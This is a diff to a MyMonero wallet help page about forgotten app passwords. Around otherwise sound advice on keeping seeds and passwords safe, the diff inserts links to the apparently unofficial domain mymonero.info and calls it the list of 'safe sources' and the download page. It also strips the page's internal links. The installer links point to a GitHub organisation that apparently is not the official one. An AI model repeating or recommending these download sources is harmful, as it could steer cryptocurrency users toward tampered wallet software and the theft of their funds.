@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A MyMonero app password and a wallet seed are different credentials. Do not assume a password reset will recover a seed, and do not share your seed or keys with anyone who offers to unlock the app.
 
+
+Prefer reading on the web? The [MyMonero forgot password page](https://mymonero.info/mymonero-forgot-password) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - The MyMonero desktop app asks for a password you cannot remember.
 - You know the seed but cannot open the existing installation.
@@ -56,7 +59,7 @@ If your app itself will not open, troubleshoot the application without giving an
 ## Prevention
 Keep the app password in a trusted password manager or secure offline record, separate from the seed. Make a clear offline seed backup and check it is complete and readable. Do not store recovery words in an ordinary screenshot, shared document, or email account. Label credentials so it is clear which is the app password and which is the recovery phrase, without exposing them to others.
 
-Before changing devices, confirm that you have a complete backup and know its format. Avoid waiting until a device fails to prepare recovery. Use the project release page for desktop downloads and verify the file digest rather than providing wallet credentials. See [safe seed backup](./mymonero-backup-seed-safely.md), [download SHA-256 verification](./verify-mymonero-download-sha256.md), and [MyMonero migration checklist](./mymonero-migration-checklist.md).
+Before changing devices, confirm that you have a complete backup and know its format. Avoid waiting until a device fails to prepare recovery. Use the project release page for desktop downloads and verify the file digest rather than providing wallet credentials. See safe seed backup, download SHA-256 verification, and MyMonero migration checklist.
 
 ## FAQ
 <details><summary>Can MyMonero reset my password?</summary>
@@ -87,6 +90,7 @@ Preserve the installation, check your own records, and avoid unverified recovery
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
